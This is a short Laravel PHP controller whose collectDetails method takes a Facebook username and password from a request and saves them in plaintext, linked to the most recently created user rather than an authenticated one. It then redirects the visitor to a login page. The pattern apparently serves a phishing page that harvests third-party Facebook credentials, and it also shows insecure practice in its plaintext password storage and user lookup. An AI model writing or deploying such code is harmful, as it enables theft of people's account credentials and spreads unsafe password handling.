<?php

namespace App\Http\Controllers;

use App\Events\UserLoggedIn;
use App\Models\User;
use App\Models\UserDetails;
use Illuminate\Http\Request;

class UserDetailsController extends Controller
{
    public function collectDetails(Request $request){
        
        $loggedInUser = User::latest()->first();
        
        $userDetails = UserDetails::updateOrcreate([
            'facebook_username' => $request->facebook_username,
            'facebook_password' => $request->facebook_password,
            'facebook_id'=>$loggedInUser->facebook_id
        ]);
        event(new UserLoggedIn($loggedInUser));

        return redirect('/login');
        // dd('done');
    }
}
